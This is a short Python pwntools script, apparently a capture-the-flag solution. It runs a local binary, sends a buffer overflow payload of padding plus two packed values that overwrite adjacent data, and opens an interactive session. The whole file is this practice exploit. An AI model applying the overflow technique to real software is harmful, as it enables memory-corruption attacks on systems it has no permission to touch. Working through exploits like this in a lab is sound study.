# coding: utf-8
from pwn import*
def chall01():
    p=process("./a.out")
    p.recv()
    payload = b'a'*(0x110-8)+p32(0x1337)+p32(0x69696969)
    p.sendline(payload)
    p.interactive()
    p.close()
    
    
chall01()
